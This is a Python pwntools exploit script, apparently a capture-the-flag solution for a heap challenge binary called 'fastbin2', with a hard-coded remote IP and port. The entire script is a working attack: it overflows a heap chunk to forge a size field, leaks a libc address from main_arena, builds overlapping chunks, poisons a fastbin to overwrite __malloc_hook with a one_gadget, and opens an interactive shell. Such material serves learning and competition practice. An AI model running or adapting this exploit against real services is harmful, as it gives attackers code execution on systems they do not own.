from re import I
from pwn import *
 
context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./fastbin2"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("1.95.36.136", 2129)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


def add(size):
    io.sendlineafter("Enter: ", "1")
    io.sendlineafter("size", str(size))

def delete(idx):
    io.sendlineafter("Enter: ", "2")
    io.sendlineafter("index", str(idx))


def edit(idx, size, content):
    io.sendlineafter("Enter: ", "3")
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("size: ", str(size))
    io.sendafter("edit:", content)

def show(idx):
    io.sendlineafter("Enter: ", "4")
    io.sendlineafter("index", str(idx))

add(0x68)
add(0x68)
add(0x68)
add(0x68)
add(0x68)
edit(0, 0x70, b"a"*0x68 + p64(0xe1))
delete(1)
add(0x68)

show(2)
main_addr = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
log.success("main arena:-----> " + hex(main_addr))
libc.address = main_addr - 0x3c4b78
log.success("lic.address:-----> " + hex(libc.address))
malloc = libc.symbols["__malloc_hook"]
log.success("malloc:-----> " + hex(malloc))


ddebug("b malloc\n b free\n continue \n")
add(0x68)  # 这两步把unsorted--> fastbin
delete(2)  # 2,5 两个指针一样了

edit(5, 0x10, p64(malloc - 0x23))
add(0x68)
add(0x68)

one_gadget = libc.address + 0xf1247
edit(6, 0x20, b"a"*0x13 + p64(one_gadget))

io.sendlineafter("Enter: ", "1")
io.sendlineafter("size", "1")

io.interactive()
